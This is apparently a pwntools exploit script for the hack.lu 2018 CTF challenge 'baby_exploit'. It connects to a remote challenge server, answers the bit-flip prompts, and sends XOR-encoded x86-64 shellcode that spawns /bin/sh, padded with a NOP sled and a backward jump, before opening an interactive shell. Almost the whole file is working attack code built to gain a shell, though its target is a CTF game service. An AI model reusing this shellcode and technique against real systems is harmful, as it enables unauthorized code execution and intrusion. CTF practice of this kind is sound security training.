#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools

IP = "arcade.fluxfingers.net"
PORT = 1807
# IP = "127.0.0.1"
# PORT = 8000

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
BIN = "./chall"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()



io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    context.noptrace = True
    io = remote(IP, PORT)  
    libc = ELF("/home/vagrant/HostTools/libc_pwn/libc-2.23.so")
elif args.local or args.debugger:
    io = process(BIN)
    # proc_base = io.libs()[
    #     "/Users/lieanu/DongFeng/hack.lu2018/pwn/baby_exploit/chall"]
    # libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']
    libc = ELF("/home/vagrant/HostTools/libc_pwn/libc-2.23.so")
else:
    parser.print_help()
    exit()

context.arch = "amd64"

def decode_str(input_str):
    for i in range(len(input_str), 1, -1):
        input_str[i-2] = input_str[i-1] ^ input_str[i-2]
    return "".join(chr(i) for i in input_str)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
pad = shellcode.ljust(0xfe-0xd7, "\x90")
pad += "\xeb\xd7\x90\x90"
payload = []
for i in pad:
    payload.append(ord(i))

print payload

payload = decode_str(payload)
print payload.encode("hex")

rud("Please enter the byte-offset you want to flip (0x80-0x139):")
sel("0xBC")
rud("Please enter the bitposition you want to flip at byte-offset(7-0):")
sel("3")
rud("Enter the Key to win:")

# if args.debugger:
#     gdb.attach(io, '''
#     b *0x{:x}
#     b *0x{:x}
#     c
#     '''.format(
#         0x0000000000400096,
#         0x00000000004000BB
#         # libc_bb + one_gg
#         )
#     )

sel(payload)
io.interactive()